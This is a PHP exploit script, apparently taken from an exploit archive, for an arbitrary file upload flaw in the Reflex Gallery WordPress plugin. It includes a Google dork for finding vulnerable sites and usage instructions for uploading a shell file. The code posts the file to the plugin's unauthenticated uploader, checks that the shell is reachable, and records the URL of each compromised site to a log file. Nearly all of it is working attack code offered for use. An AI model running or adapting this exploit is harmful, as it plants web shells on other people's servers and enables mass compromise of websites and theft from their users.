<?php

/*
  # Exploit Title: Wordpress Plugin Reflex Gallery - Arbitrary File Upload
  # TIPE:          Arbitrary File Upload
  # Google DORK:   inurl:"wp-content/plugins/reflex-gallery/"
  # Vendor:        https://wordpress.org/plugins/reflex-gallery/
  # Tested on:     Linux
  # Version:       3.1.3 (Last)
  # EXECUTE:       php exploit.php www.alvo.com.br shell.php
  # OUTPUT:        Exploit_AFU.txt
  # POC            http://i.imgur.com/mpjXaZ9.png
  # REF COD        http://1337day.com/exploit/23369
  --------------------------------------------------------------------------------
  <form method = "POST" action = "" enctype = "multipart/form-data" >
  <input type = "file" name = "qqfile"><br>
  <input type = "submit" name = "Submit" value = "Pwn!">
  </form >
  --------------------------------------------------------------------------------

  # AUTOR:         googleINURL
  # Blog:          http://blog.inurl.com.br
  # Twitter:       https://twitter.com/googleinurl
  # Fanpage:       https://fb.com/InurlBrasil
  # Pastebin	   http://pastebin.com/u/Googleinurl
  # GIT:           https://github.com/googleinurl
  # PSS:           http://packetstormsecurity.com/user/googleinurl/
  # YOUTUBE        https://www.youtube.com/channel/UCFP-WEzs5Ikdqw0HBLImGGA
 */

error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();

function __plus() {

    ob_flush();
    flush();
}

function __request($params) {

    $objcurl = curl_init();
    curl_setopt($objcurl, CURLOPT_URL, "{$params['host']}/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=03");
    curl_setopt($objcurl, CURLOPT_POST, 1);
    curl_setopt($objcurl, CURLOPT_HEADER, 1);
    curl_setopt($objcurl, CURLOPT_REFERER, $params['host']);
    curl_setopt($objcurl, CURLOPT_POSTFIELDS, array('qqfile' => "@{$params['file']}"));
    curl_setopt($objcurl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($objcurl, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($objcurl, CURLOPT_RETURNTRANSFER, 1);
    $info['corpo'] = curl_exec($objcurl) . __plus();
    $info['server'] = curl_getinfo($objcurl) . __plus();
    curl_close($objcurl) . __plus();
    return $info;
}

echo "[+]  Wordpress Plugin Reflex Gallery - Arbitrary File Upload Vulnerability\n\n";
$params = array('file' => isset($argv[2]) ? $argv[2] : exit("\n0x[ERRO] DEFINE FILE SHELL!\n"), 'host' => isset($argv[1]) ? (strstr($argv[1], 'http') ? $argv[1] : "http://{$argv[1]}") : exit("\n0x[ERRO] DEFINE TARGET!\n"));
__request($params) . __plus();
$_s = "{$params['host']}/wp-content/uploads/2015/03/{$params['file']}";
$_h = get_headers("{$params['host']}/wp-content/uploads/2015/03/{$params['file']}", 1);
foreach ($_h as $key => $value) {
    echo date("h:m:s") . " [INFO][{$key}]:: {$value}\n";
}
$_x = (strstr(($_h[0] . (isset($_h[1]) ? $_h[1] : NULL)), '200'));
print "\n" . date("h:m:s") . " [INFO][COD]:: " . (!empty($_x) ? '[+] VULL' : '[-] NOT VULL');
print "\n" . date("h:m:s") . " [INFO][SHELL]:: " . (!empty($_x) ? "[+] {$_s}" . file_put_contents("Exploit_AFU.txt", "{$_s}\n\n", FILE_APPEND) : '[-] ERROR!');
